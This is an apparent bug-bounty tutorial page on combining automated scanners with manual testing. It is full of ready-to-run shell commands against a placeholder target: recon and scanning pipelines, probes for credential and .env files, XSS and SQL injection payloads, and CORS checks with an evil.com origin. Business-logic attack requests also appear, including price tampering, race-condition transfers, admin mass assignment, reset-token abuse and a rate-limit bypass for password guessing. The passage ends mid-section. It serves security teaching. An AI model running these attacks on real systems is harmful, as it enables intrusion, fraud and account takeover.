---
title: Automated vs Manual Testing Balance
description: Strategic methodologies for combining automated scanning with manual exploitation techniques to maximize vulnerability discovery and coverage during bug hunting engagements.
navigation:
  icon: i-lucide-scale
  title: Automated vs Manual Testing Balance
---

## Understanding the Testing Balance

::note
The **Automated vs Manual Testing Balance** is the strategic discipline of knowing **when to let tools work** and **when human intuition takes over**. Neither approach alone finds all vulnerabilities — the highest-performing bug hunters master the art of blending both into a unified workflow.
::

Automated tools excel at breadth — scanning thousands of endpoints, parameters, and payloads at machine speed. Manual testing excels at depth — understanding business logic, chaining vulnerabilities, and exploiting context-specific flaws that no scanner can detect.

The balance is not 50/50. It shifts dynamically based on the target, scope, vulnerability class, and the phase of your engagement.

::callout{icon="i-lucide-scale" color="amber"}
The rule of thumb: **Automate the boring, manual the interesting.** Use automation for reconnaissance, parameter discovery, and known-pattern detection. Switch to manual when you find anomalies, business logic, or anything that requires contextual reasoning.
::

```
┌──────────────────────────────────────────────────────────────────────────┐
│                    THE TESTING SPECTRUM                                  │
│                                                                          │
│  ◀── FULLY AUTOMATED                              FULLY MANUAL ──▶     │
│                                                                          │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐ │
│  │ Mass     │  │ Pattern  │  │ Hybrid   │  │ Logic    │  │ Creative │ │
│  │ Scanning │  │ Matching │  │ Guided   │  │ Analysis │  │ Exploit  │ │
│  │          │  │          │  │          │  │          │  │ Chains   │ │
│  │ Nuclei   │  │ SQLMap   │  │ Burp +   │  │ IDOR     │  │ Multi-   │ │
│  │ Nmap     │  │ Dalfox   │  │ Manual   │  │ AuthZ    │  │ Step     │ │
│  │ FFUF     │  │ Nikto    │  │ Review   │  │ Race     │  │ Novel    │ │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘  └──────────┘ │
│                                                                          │
│  Coverage: HIGH    Speed: FAST    Depth: MODERATE → DEEP                │
│  Accuracy: LOW     False+: HIGH   False+: LOW → NONE                   │
│                                                                          │
│  ────────────────────────────────────────────────────────────────────    │
│  Sweet Spot: 60% Automated Recon → 40% Manual Deep-Dive                │
│  Critical Vulns Found: 20% Automated / 80% Manual                      │
│  Informational Findings: 90% Automated / 10% Manual                    │
└──────────────────────────────────────────────────────────────────────────┘
```

### Why Balance Matters

::card-group
  ::card
  ---
  title: Automation Alone Misses Business Logic
  icon: i-lucide-brain
  ---
  No scanner understands that a **discount code should only work once**, or that a **user shouldn't be able to approve their own purchase order**. Business logic flaws require human reasoning and contextual understanding.
  ::

  ::card
  ---
  title: Manual Alone is Too Slow
  icon: i-lucide-timer
  ---
  Manually testing every parameter on every endpoint of a large application is **physically impossible**. A target with 500 endpoints and 2,000 parameters would take months to test manually. Automation covers this surface in hours.
  ::

  ::card
  ---
  title: Critical Bugs Live at the Intersection
  icon: i-lucide-merge
  ---
  The highest-value vulnerabilities are found when **automation identifies anomalies** and **manual investigation confirms and escalates** them. The handoff between tools and human analysis is where critical findings emerge.
  ::

  ::card
  ---
  title: Duplicates vs Unique Findings
  icon: i-lucide-copy-minus
  ---
  Automated-only hunters compete with every other scanner user and **get duplicates constantly**. Manual depth on automation-surfaced leads produces **unique findings** that no one else has reported.
  ::
::

---

## Decision Framework

::tip
Before starting any engagement, use this decision matrix to determine the optimal balance for your specific target, scope, and vulnerability class.
::

### When to Automate vs When to Go Manual

::accordion
  ::accordion-item
  ---
  icon: i-lucide-bot
  label: "Automate When..."
  ---

  Use automation as the primary approach when these conditions are met:

  - **Large attack surface** — hundreds or thousands of endpoints, subdomains, or parameters
  - **Known vulnerability patterns** — testing for CVEs, default credentials, misconfigurations
  - **Repetitive tasks** — directory brute-forcing, parameter fuzzing, header injection testing
  - **Coverage requirements** — need to test every subdomain or every parameter
  - **Initial reconnaissance** — mapping the attack surface before deep-diving
  - **Regression testing** — re-checking previously found vulnerability classes
  - **Time-limited engagements** — short bounty blitzes where speed matters

  ```bash
  # Automated reconnaissance pipeline
  # Step 1: Subdomain enumeration
  subfinder -d target.com -all -silent | \
    dnsx -silent -a -resp | sort -u > subdomains.txt
  echo "[*] Found $(wc -l < subdomains.txt) subdomains"

  # Step 2: HTTP probing and tech detection
  cat subdomains.txt | httpx -silent -status-code -title -tech-detect \
    -content-length -web-server -json -o httpx_results.json
  echo "[*] Live hosts: $(wc -l < httpx_results.json)"

  # Step 3: URL and parameter discovery
  cat subdomains.txt | httpx -silent | katana -d 5 -jc -silent | sort -u > all_urls.txt
  cat subdomains.txt | httpx -silent | waybackurls | sort -u >> all_urls.txt
  cat subdomains.txt | httpx -silent | gau --threads 5 | sort -u >> all_urls.txt
  sort -u all_urls.txt -o all_urls.txt
  echo "[*] Discovered $(wc -l < all_urls.txt) URLs"

  # Step 4: Parameter extraction
  cat all_urls.txt | grep "=" | uro | sort -u > parameterized_urls.txt
  echo "[*] URLs with parameters: $(wc -l < parameterized_urls.txt)"

  # Step 5: Known vulnerability scanning
  nuclei -l subdomains.txt -t cves/ -t vulnerabilities/ -t exposures/ \
    -t misconfiguration/ -t takeovers/ -severity critical,high,medium \
    -silent -o nuclei_results.txt
  echo "[*] Nuclei findings: $(wc -l < nuclei_results.txt)"
  ```

  | Automation Strength | Vulnerability Class | Recommended Tools |
  | --- | --- | --- |
  | Excellent | Known CVEs | Nuclei, Nessus, OpenVAS |
  | Excellent | Subdomain Takeover | Subjack, Nuclei |
  | Excellent | Directory/File Discovery | FFUF, Feroxbuster, Dirsearch |
  | Excellent | Default Credentials | Nuclei, Hydra, Medusa |
  | Excellent | SSL/TLS Misconfigurations | testssl.sh, sslyze |
  | Excellent | Header Security | SecurityHeaders, Nuclei |
  | Good | Reflected XSS | Dalfox, XSStrike, kxss |
  | Good | Open Redirects | OpenRedireX, Nuclei |
  | Good | CORS Misconfiguration | CORScanner, Nuclei |
  | Moderate | SQL Injection | SQLMap, ghauri |
  | Moderate | SSRF (basic) | Nuclei custom templates |
  | Moderate | SSTI (detection only) | tplmap, Nuclei |
  ::

  ::accordion-item
  ---
  icon: i-lucide-hand
  label: "Go Manual When..."
  ---

  Switch to manual testing when these conditions are present:

  - **Business logic flaws** — payment manipulation, workflow bypass, privilege escalation
  - **Authentication/Authorization** — IDOR, broken access control, role-based bypass
  - **Complex exploit chains** — combining multiple low-severity issues into critical impact
  - **WAF/filter bypass required** — automated payloads get blocked, need creative encoding
  - **Unique application behavior** — custom frameworks, non-standard APIs, WebSocket flows
  - **State-dependent vulnerabilities** — race conditions, multi-step processes, session handling
  - **Post-authentication testing** — deep application logic behind login walls
  - **API abuse scenarios** — mass assignment, GraphQL depth attacks, rate limit bypass

  ```bash
  # Manual testing workflow indicators
  # When you see these signals, switch to manual:

  # Signal 1: Custom API with non-standard authentication
  curl -s -I "https://target.com/api/v2/me" \
    -H "Authorization: Bearer TOKEN" | grep -iE "x-custom|x-tenant|x-role"
  # Non-standard headers = custom logic = manual testing required

  # Signal 2: Multi-step workflows
  # Step 1: Create order
  ORDER=$(curl -s -X POST "https://target.com/api/orders" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"items":["item1"],"quantity":1}' | jq -r '.order_id')

  # Step 2: Apply discount (can we apply after payment?)
  curl -s -X POST "https://target.com/api/orders/${ORDER}/discount" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"code":"SAVE50"}'

  # Step 3: Process payment (does it use pre-discount or post-discount price?)
  curl -s -X POST "https://target.com/api/orders/${ORDER}/pay" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"payment_method":"card_123"}'
  # This workflow bypass requires human understanding of business logic

  # Signal 3: Role-based access control testing
  # Test same endpoint with different user roles
  for ROLE_TOKEN in "$USER_TOKEN" "$MOD_TOKEN" "$ADMIN_TOKEN"; do
    echo "--- Role: $(curl -s "https://target.com/api/me" \
      -H "Authorization: Bearer $ROLE_TOKEN" | jq -r '.role') ---"
    curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com/api/admin/users" \
      -H "Authorization: Bearer $ROLE_TOKEN"
  done

  # Signal 4: Stateful interactions
  # Race condition in fund transfer
  for i in $(seq 1 20); do
    curl -s -X POST "https://target.com/api/transfer" \
      -H "Authorization: Bearer TOKEN" \
      -d '{"to":"attacker","amount":100}' &
  done
  wait
  ```

  | Manual Testing Strength | Vulnerability Class | Approach |
  | --- | --- | --- |
  | Essential | Business Logic Flaws | Workflow analysis, state manipulation |
  | Essential | IDOR / Broken Access Control | Role swapping, ID tampering |
  | Essential | Race Conditions | Concurrent request timing |
  | Essential | Authentication Bypass | Token manipulation, flow abuse |
  | Essential | Privilege Escalation | Parameter tampering, role injection |
  | Essential | Payment/Financial Bugs | Price manipulation, coupon abuse |
  | Essential | Multi-step Exploit Chains | Creative chaining, context-aware exploitation |
  | High Value | Stored XSS (complex) | Context-specific payload crafting |
  | High Value | SSRF (with bypass) | Filter evasion, protocol tricks |
  | High Value | GraphQL Abuse | Schema analysis, query manipulation |
  | High Value | WebSocket Exploitation | Protocol-level analysis |
  | High Value | OAuth/SSO Bypass | Flow manipulation, redirect abuse |
  ::

  ::accordion-item
  ---
  icon: i-lucide-combine
  label: "Hybrid Approach (Best of Both)"
  ---

  The most effective strategy combines automated discovery with manual exploitation.

  ```
  ┌────────────────────────────────────────────────────────────────────┐
  │                   HYBRID TESTING WORKFLOW                         │
  │                                                                    │
  │   PHASE 1: AUTOMATED RECONNAISSANCE                              │
  │   ════════════════════════════════════                             │
  │   Subdomain Enum → HTTP Probing → URL Discovery → Tech Stack     │
  │                           │                                        │
  │                           ▼                                        │
  │   PHASE 2: AUTOMATED SCANNING                                    │
  │   ════════════════════════════                                    │
  │   Nuclei → Dalfox → SQLMap → FFUF → CORScanner                  │
  │                           │                                        │
  │                           ▼                                        │
  │   PHASE 3: TRIAGE & PRIORITIZE (Human Decision Point)            │
  │   ═══════════════════════════════════════════════════             │
  │   Review results → Identify anomalies → Prioritize targets       │
  │                           │                                        │
  │              ┌────────────┼────────────┐                          │
  │              ▼            ▼            ▼                           │
  │   PHASE 4A:        PHASE 4B:     PHASE 4C:                       │
  │   Deep Manual      Bypass        Chain                            │
  │   Testing          Development   Building                        │
  │   ───────────      ──────────    ─────────                        │
  │   Business logic   WAF evasion   Multi-vuln                      │
  │   Auth bypass      Filter craft  combinations                    │
  │   IDOR hunting     Encoding      Impact                          │
  │   Race conditions  tricks        escalation                      │
  │                           │                                        │
  │                           ▼                                        │
  │   PHASE 5: VALIDATION & PoC                                      │
  │   ═════════════════════════                                       │
  │   Confirm → Escalate Impact → Build PoC → Document → Report      │
  └────────────────────────────────────────────────────────────────────┘
  ```

  ```bash
  # Hybrid workflow in practice

  # AUTOMATED: Discover all endpoints
  katana -u "https://target.com" -d 5 -jc -silent | sort -u > endpoints.txt
  echo "[AUTO] $(wc -l < endpoints.txt) endpoints discovered"

  # AUTOMATED: Fuzz all parameters for reflection
  cat endpoints.txt | grep "=" | qsreplace "FUZZ" | \
    httpx -silent -mc 200 -mr "FUZZ" > reflections.txt
  echo "[AUTO] $(wc -l < reflections.txt) parameters reflect input"

  # AUTOMATED: Quick XSS scan on reflected parameters
  cat reflections.txt | dalfox pipe --silence --only-poc > auto_xss.txt
  echo "[AUTO] $(wc -l < auto_xss.txt) potential XSS found"

  # >>> HUMAN DECISION POINT <<<
  echo "[MANUAL] Review auto_xss.txt — filter false positives"
  echo "[MANUAL] Check context of each reflection for manual bypass opportunities"

  # MANUAL: For each reflected parameter that dalfox missed,
  # analyze the rendering context
  while read url; do
    echo "=== Analyzing: $url ==="
    RESPONSE=$(curl -s "$url")
    
    # Check rendering context
    echo "$RESPONSE" | grep -n "FUZZ" | head -5
    # Is it inside: tag attribute? JavaScript? HTML body? JSON? CSS?
    # Each context needs a different manual payload
  done < reflections.txt

  # MANUAL: Craft context-specific bypasses
  # Example: Input reflected inside JavaScript string
  curl -s "https://target.com/search?q=';alert(document.domain);//"
  
  # Example: Input reflected inside HTML attribute
  curl -s "https://target.com/search?q=\"+onfocus=alert(document.domain)+autofocus+\""

  # Example: Input reflected but filtered — manual bypass
  curl -s "https://target.com/search?q=<svg/onload=alert(document.domain)>"
  curl -s "https://target.com/search?q=<details/open/ontoggle=alert(document.domain)>"
  ```
  ::
::

---

## Automated Testing Arsenal

::badge
Breadth & Speed
::

### Reconnaissance Automation

::tabs
  ::tabs-item{icon="i-lucide-radar" label="Subdomain Discovery"}

  ```bash
  # Multi-source subdomain enumeration
  # Using subfinder (passive)
  subfinder -d target.com -all -silent -o subs_subfinder.txt

  # Using amass (passive + active)
  amass enum -passive -d target.com -o subs_amass.txt

  # Using assetfinder
  assetfinder --subs-only target.com > subs_assetfinder.txt

  # Using findomain
  findomain -t target.com -q > subs_findomain.txt

  # Using crt.sh (certificate transparency)
  curl -s "https://crt.sh/?q=%25.target.com&output=json" | \
    jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > subs_crt.txt

  # Merge and deduplicate
  cat subs_*.txt | sort -u > all_subdomains.txt
  echo "[*] Total unique subdomains: $(wc -l < all_subdomains.txt)"

  # Resolve and filter live hosts
  cat all_subdomains.txt | dnsx -silent -a -resp -o resolved.txt
  echo "[*] Resolving subdomains: $(wc -l < resolved.txt)"

  # Probe for HTTP services
  cat all_subdomains.txt | httpx -silent -status-code -title \
    -tech-detect -content-length -web-server -follow-redirects \
    -json -o live_hosts.json
  echo "[*] Live HTTP services: $(wc -l < live_hosts.json)"

  # Extract unique IPs for network-level analysis
  cat resolved.txt | awk '{print $2}' | sort -u > unique_ips.txt
  echo "[*] Unique IPs: $(wc -l < unique_ips.txt)"

  # Check for wildcard DNS (false positive prevention)
  RANDOM_SUB="thissubdomainshouldnotexist$(date +%s)"
  WILDCARD=$(dig +short ${RANDOM_SUB}.target.com)
  if [ -n "$WILDCARD" ]; then
    echo "[!] Wildcard DNS detected: $WILDCARD — filter results accordingly"
  fi
  ```
  ::

  ::tabs-item{icon="i-lucide-link" label="URL & Parameter Discovery"}

  ```bash
  # Multi-source URL collection
  # Active crawling
  cat live_hosts.json | jq -r '.url' | katana -d 5 -jc -kf all \
    -silent -o urls_katana.txt

  # Passive URL sources
  cat all_subdomains.txt | waybackurls | sort -u > urls_wayback.txt
  cat all_subdomains.txt | gau --threads 10 | sort -u > urls_gau.txt

  # Common Crawl
  for sub in $(cat all_subdomains.txt); do
    curl -s "https://index.commoncrawl.org/CC-MAIN-2024-10-index?url=${sub}/*&output=json" | \
      jq -r '.url' 2>/dev/null
  done | sort -u > urls_commoncrawl.txt

  # Merge all URL sources
  cat urls_*.txt | sort -u > all_urls.txt
  echo "[*] Total unique URLs: $(wc -l < all_urls.txt)"

  # Extract parameterized URLs
  cat all_urls.txt | grep "=" | uro | sort -u > parameterized.txt
  echo "[*] URLs with parameters: $(wc -l < parameterized.txt)"

  # Extract unique parameters
  cat parameterized.txt | unfurl -u keys | sort | uniq -c | sort -rn > unique_params.txt
  echo "[*] Unique parameters found:"
  head -20 unique_params.txt

  # JavaScript file extraction for manual review
  cat all_urls.txt | grep -iE "\.js(\?|$)" | sort -u > js_files.txt
  echo "[*] JavaScript files: $(wc -l < js_files.txt)"

  # Extract endpoints from JavaScript
  cat js_files.txt | while read jsurl; do
    curl -s "$jsurl" | grep -oP '["'"'"']/api/[a-zA-Z0-9/_-]+["'"'"']' | tr -d '"'"'"
  done | sort -u > api_endpoints_from_js.txt

  # Hidden parameter discovery with Arjun
  cat live_hosts.json | jq -r '.url' | head -20 | while read url; do
    arjun -u "${url}" -m GET POST -t 10 --stable -oT arjun_params.txt 2>/dev/null
  done
  ```
  ::

  ::tabs-item{icon="i-lucide-folder-search" label="Directory & File Fuzzing"}

  ```bash
  # FFUF directory brute-forcing
  ffuf -u "https://target.com/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
    -mc 200,301,302,403 -ac -t 50 -o ffuf_dirs.json -of json

  # FFUF with multiple wordlists
  ffuf -u "https://target.com/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ \
    -mc 200,301,302,403 -ac -t 40

  # Recursive directory discovery
  feroxbuster -u "https://target.com" \
    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
    --depth 4 --threads 30 --status-codes 200 301 302 403 \
    --auto-tune --collect-backups --collect-words

  # Extension-based fuzzing
  ffuf -u "https://target.com/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
    -e .php,.asp,.aspx,.jsp,.json,.xml,.yaml,.yml,.env,.bak,.old,.swp,.git,.config \
    -mc 200,301,302 -ac -t 40

  # API endpoint fuzzing
  ffuf -u "https://target.com/api/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
    -mc 200,201,204,301,302,401,403,405 -ac -t 30

  # API version fuzzing
  for version in v1 v2 v3 v4 internal beta staging dev admin; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com/api/${version}/" --max-time 5)
    [ "$STATUS" != "404" ] && echo "[FOUND] /api/${version}/ → HTTP $STATUS"
  done

  # Sensitive file discovery
  ffuf -u "https://target.com/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt \
    -mc 200 -ac -t 30 -o sensitive_files.json -of json

  # Git exposure check
  for path in .git/HEAD .git/config .gitignore .env .env.local .env.production \
    .env.staging docker-compose.yml Dockerfile wp-config.php config.php \
    database.yml secrets.yml .aws/credentials; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com/${path}" --max-time 3)
    [ "$STATUS" = "200" ] && echo "[EXPOSED] /${path}"
  done
  ```
  ::
::

### Vulnerability Scanning Automation

::tabs
  ::tabs-item{icon="i-lucide-shield-alert" label="Nuclei Scanning"}

  ```bash
  # Comprehensive nuclei scan with prioritized templates
  nuclei -l live_hosts.json -jq '.url' \
    -t cves/ -severity critical,high \
    -rate-limit 100 -bulk-size 50 -concurrency 25 \
    -silent -o nuclei_cve_results.txt

  # Misconfiguration scanning
  nuclei -l live_hosts.json -jq '.url' \
    -t misconfiguration/ -t exposures/ -t default-logins/ \
    -severity critical,high,medium \
    -silent -o nuclei_misconfig_results.txt

  # Technology-specific scanning
  nuclei -l live_hosts.json -jq '.url' \
    -t technologies/ \
    -silent -o nuclei_tech_results.txt

  # Custom nuclei template for specific target patterns
  cat << 'TEMPLATE' > custom-idor-check.yaml
  id: custom-idor-check
  info:
    name: Custom IDOR Check
    severity: high
  
  http:
    - raw:
        - |
          GET /api/users/{{user_id}} HTTP/1.1
          Host: {{Hostname}}
          Authorization: Bearer {{token}}
      payloads:
        user_id:
          - "1"
          - "2"
          - "3"
          - "100"
          - "1000"
      matchers:
        - type: status
          status:
            - 200
        - type: word
          words:
            - "email"
            - "phone"
          condition: or
      matchers-condition: and
  TEMPLATE

  nuclei -l targets.txt -t custom-idor-check.yaml -var token=YOUR_TOKEN

  # Headless nuclei for JavaScript-rendered content
  nuclei -l targets.txt -headless -t headless/ -silent

  # Nuclei with authenticated scanning
  nuclei -l targets.txt -t authenticated/ \
    -H "Authorization: Bearer TOKEN" \
    -H "Cookie: session=SESSION_VALUE" \
    -silent -o nuclei_auth_results.txt

  # Nuclei workflow for chained checks
  nuclei -l targets.txt -w workflows/ -silent

  # Rate-limited scanning for production targets
  nuclei -l targets.txt -t cves/ \
    -rate-limit 10 -bulk-size 5 -concurrency 3 \
    -timeout 15 -retries 2 \
    -silent -o nuclei_careful_results.txt
  ```
  ::

  ::tabs-item{icon="i-lucide-zap" label="XSS Automation"}

  ```bash
  # Dalfox — automated XSS scanning
  # Pipe mode with parameter discovery
  cat parameterized.txt | dalfox pipe \
    --blind "https://YOUR_XSS_HUNTER" \
    --waf-evasion \
    --delay 100 \
    --only-poc \
    --silence \
    -o dalfox_results.txt

  # Dalfox with custom payloads
  cat parameterized.txt | dalfox pipe \
    --custom-payload custom_xss_payloads.txt \
    --skip-bav \
    --only-poc

  # kxss — reflection detection (pre-filter for manual testing)
  cat parameterized.txt | kxss | tee kxss_reflections.txt
  echo "[*] Reflected parameters: $(grep "Unfiltered" kxss_reflections.txt | wc -l)"

  # gxss — inject canary and check reflection
  cat parameterized.txt | gxss -p "c4n4ry" | \
    httpx -silent -mc 200 -mr "c4n4ry" > reflected_urls.txt

  # XSStrike — advanced XSS detection
  while read url; do
    python3 xsstrike.py -u "$url" --crawl -l 3 --blind 2>/dev/null
  done < reflected_urls.txt

  # Automated DOM XSS detection
  cat js_files.txt | while read jsurl; do
    curl -s "$jsurl" | grep -cE "(innerHTML|document\.write|eval\(|\.html\()" && \
      echo "[DOM] Potential DOM XSS source in: $jsurl"
  done

  # Mass reflection analysis with response context
  cat parameterized.txt | qsreplace '"><test1337>' | \
    httpx -silent -mc 200 -mr '"><test1337>' | while read url; do
    RESPONSE=$(curl -s "$url")
    CONTEXT=$(echo "$RESPONSE" | grep -oP '.{30}"><test1337>.{30}' | head -1)
    echo "[REFLECTED] $url"
    echo "  Context: $CONTEXT"
    echo ""
  done
  ```
  ::

  ::tabs-item{icon="i-lucide-database" label="SQLi Automation"}

  ```bash
  # SQLMap batch scanning
  cat parameterized.txt | while read url; do
    sqlmap -u "$url" --batch --random-agent \
      --level 3 --risk 2 \
      --threads 5 \
      --output-dir=sqlmap_results/ \
      --smart \
      --technique=BEUST \
      2>/dev/null | grep -E "injectable|vulnerable|payload"
  done

  # SQLMap with saved Burp requests
  find burp_requests/ -name "*.txt" | while read req; do
    sqlmap -r "$req" --batch --random-agent \
      --level 5 --risk 3 \
      --tamper=space2comment \
      --output-dir=sqlmap_results/ 2>/dev/null
  done

  # ghauri — alternative SQLi scanner
  cat parameterized.txt | while read url; do
    ghauri -u "$url" --batch --level 3 --random-agent 2>/dev/null | \
      grep -iE "injectable|vulnerable"
  done

  # Quick boolean-based SQLi check
  cat parameterized.txt | while read url; do
    TRUE_LEN=$(curl -s "$(echo $url | sed 's/=.*/=1 AND 1=1/')" | wc -c)
    FALSE_LEN=$(curl -s "$(echo $url | sed 's/=.*/=1 AND 1=2/')" | wc -c)
    DIFF=$((TRUE_LEN - FALSE_LEN))
    if [ "$DIFF" -ne 0 ] && [ "$DIFF" -gt 10 ]; then
      echo "[POTENTIAL SQLi] $url (diff: $DIFF bytes)"
    fi
  done

  # Time-based blind detection
  cat parameterized.txt | while read url; do
    NORMAL_TIME=$(curl -o /dev/null -s -w "%{time_total}" "$url")
    SLEEP_TIME=$(curl -o /dev/null -s -w "%{time_total}" \
      "$(echo $url | sed "s/=.*/=1'+AND+SLEEP(3)--+-/")")
    DIFF=$(echo "$SLEEP_TIME - $NORMAL_TIME" | bc 2>/dev/null)
    if [ "$(echo "$DIFF > 2.5" | bc 2>/dev/null)" = "1" ]; then
      echo "[TIME-BASED SQLi] $url (delay: ${DIFF}s)"
    fi
  done
  ```
  ::

  ::tabs-item{icon="i-lucide-radar" label="SSRF & CORS Automation"}

  ```bash
  # SSRF parameter scanning
  SSRF_CANARY="http://YOUR_BURP_COLLABORATOR"

  # Test all parameters for SSRF
  cat parameterized.txt | qsreplace "$SSRF_CANARY" | \
    httpx -silent -mc 200,301,302 -o ssrf_candidates.txt

  # SSRF with specific parameter targeting
  SSRF_PARAMS="url uri path dest redirect site src page feed host callback file document link load open navigate ref"
  for param in $SSRF_PARAMS; do
    cat live_hosts.json | jq -r '.url' | while read base_url; do
      curl -s -o /dev/null -w "%{http_code}" \
        "${base_url}?${param}=${SSRF_CANARY}" --max-time 5
    done
  done

  # CORS misconfiguration scanning
  cat live_hosts.json | jq -r '.url' | while read url; do
    # Test reflected origin
    ORIGIN_HEADER=$(curl -s -I "$url" \
      -H "Origin: https://evil.com" | \
      grep -i "access-control-allow-origin" | tr -d '\r')
    
    if echo "$ORIGIN_HEADER" | grep -qi "evil.com"; then
      CREDS=$(curl -s -I "$url" \
        -H "Origin: https://evil.com" | \
        grep -i "access-control-allow-credentials" | tr -d '\r')
      echo "[CORS VULN] $url"
      echo "  $ORIGIN_HEADER"
      echo "  $CREDS"
    fi
  done | tee cors_results.txt

  # Null origin CORS check
  cat live_hosts.json | jq -r '.url' | while read url; do
    HEADER=$(curl -s -I "$url" -H "Origin: null" | \
      grep -i "access-control-allow-origin: null" | tr -d '\r')
    [ -n "$HEADER" ] && echo "[CORS NULL] $url → $HEADER"
  done

  # Bulk CORS testing with CORScanner
  python3 CORScanner.py -i live_urls.txt -t 20 -o cors_scan_results.json
  ```
  ::
::

### Automated Scanning Limitations

::warning
Automated scanners have **critical blind spots**. Understanding these limitations tells you exactly where manual testing adds the most value.
::

::collapsible

**What Automated Scanners Miss:**

| Limitation | Why Scanners Fail | Manual Advantage |
| --- | --- | --- |
| Business Logic | No understanding of intended workflow | Human understands what *should* vs *shouldn't* happen |
| Multi-step Exploits | Can only test single requests | Human chains multiple requests in sequence |
| Context-Dependent XSS | Generic payloads don't match rendering context | Human reads source, identifies exact context |
| Authorization Flaws | Cannot reason about who should access what | Human tests with multiple user roles |
| Race Conditions | Timing-dependent, requires parallel execution | Human crafts precisely timed concurrent requests |
| Second-Order Injection | Payload triggers on different endpoint than injection | Human maps data flow across endpoints |
| GraphQL Complexity | Limited schema understanding | Human analyzes schema and crafts nested queries |
| WebSocket Protocols | Most scanners ignore WebSocket traffic | Human intercepts and manipulates WS messages |
| Encrypted/Obfuscated Params | Cannot decode custom encoding | Human reverse-engineers encoding scheme |
| State Machine Flaws | Cannot model application state transitions | Human maps valid/invalid state transitions |
| API Mass Assignment | Doesn't know which fields shouldn't be writable | Human adds extra fields and checks impact |
| Session Fixation | Requires multi-browser/multi-session testing | Human manages multiple sessions simultaneously |

::

---

## Manual Testing Techniques

::badge
Depth & Precision
::

### Business Logic Testing

::accordion
  ::accordion-item
  ---
  icon: i-lucide-shopping-cart
  label: E-Commerce Logic Flaws
  ---

  ```bash
  # Price manipulation — modify price in client-side request
  # Step 1: Intercept add-to-cart request
  curl -s -X POST "https://target.com/api/cart/add" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"product_id":"123","quantity":1,"price":0.01}'
  # Does the server accept client-provided price?

  # Negative quantity attack
  curl -s -X POST "https://target.com/api/cart/add" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"product_id":"123","quantity":-1}'
  # Does negative quantity credit the account?

  # Currency confusion
  curl -s -X POST "https://target.com/api/orders" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"items":[{"id":"123","quantity":1}],"currency":"JPY"}'
  # Does it charge 100 JPY ($0.67) instead of $100?

  # Coupon stacking
  curl -s -X POST "https://target.com/api/cart/coupon" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"code":"SAVE20"}'
  curl -s -X POST "https://target.com/api/cart/coupon" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"code":"SAVE30"}'
  # Can multiple exclusive coupons be stacked?

  # Order manipulation after payment
  curl -s -X PATCH "https://target.com/api/orders/ORDER_ID" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"shipping_address":"new_address","items":[{"id":"expensive_item","quantity":10}]}'
  # Can items be changed after payment is processed?

  # Free shipping threshold bypass
  # Add expensive item → get free shipping → remove item before payment
  curl -s -X POST "https://target.com/api/cart/add" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"product_id":"999","quantity":1}'
  # Cart now qualifies for free shipping
  curl -s -X DELETE "https://target.com/api/cart/item/999" \
    -H "Authorization: Bearer TOKEN"
  # Is free shipping retained after removing the qualifying item?

  # Decimal precision abuse
  curl -s -X POST "https://target.com/api/transfer" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"amount":0.001,"to":"attacker","repeat":10000}'
  # Rounding errors that accumulate over many transactions

  # Gift card balance manipulation
  curl -s -X POST "https://target.com/api/gift-card/redeem" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"code":"GIFT123","amount":-500}'
  # Negative redemption = credit to gift card?
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-user-cog
  label: Account & Profile Logic Flaws
  ---

  ```bash
  # Email change without verification
  curl -s -X PUT "https://target.com/api/user/email" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"email":"attacker@evil.com"}'
  # Is old email notified? Is verification required?

  # Account merge exploitation
  # Register with victim's email (case variation)
  curl -s -X POST "https://target.com/api/register" \
    -d '{"email":"Victim@Target.com","password":"test123"}'
  # Does this merge with or override the existing account?

  # Password reset logic bypass
  # Step 1: Request reset for victim
  curl -s -X POST "https://target.com/api/password/reset" \
    -d '{"email":"victim@target.com"}'
  
  # Step 2: Request reset for attacker
  curl -s -X POST "https://target.com/api/password/reset" \
    -d '{"email":"attacker@evil.com"}'
  
  # Step 3: Use attacker's reset token on victim's account
  curl -s -X POST "https://target.com/api/password/reset/confirm" \
    -d '{"token":"ATTACKER_RESET_TOKEN","email":"victim@target.com","password":"hacked"}'

  # Deactivation/deletion bypass
  # Deactivate account then re-login
  curl -s -X POST "https://target.com/api/account/deactivate" \
    -H "Authorization: Bearer TOKEN"
  curl -s -X POST "https://target.com/api/login" \
    -d '{"email":"user@test.com","password":"test123"}'
  # Is the account truly deactivated?

  # Profile field type confusion
  curl -s -X PUT "https://target.com/api/user/profile" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"role":"admin","is_admin":true,"permissions":["*"],"group":"administrators"}'
  # Mass assignment — does the API accept fields that shouldn't be user-modifiable?

  # Rate limit bypass on login
  for i in $(seq 1 50); do
    curl -s -o /dev/null -w "%{http_code}" -X POST "https://target.com/api/login" \
      -H "X-Forwarded-For: 10.0.0.$((RANDOM % 255))" \
      -d "email=victim@target.com&password=attempt${i}"
  done
  # Does X-Forwarded-For bypass the rate limiter?
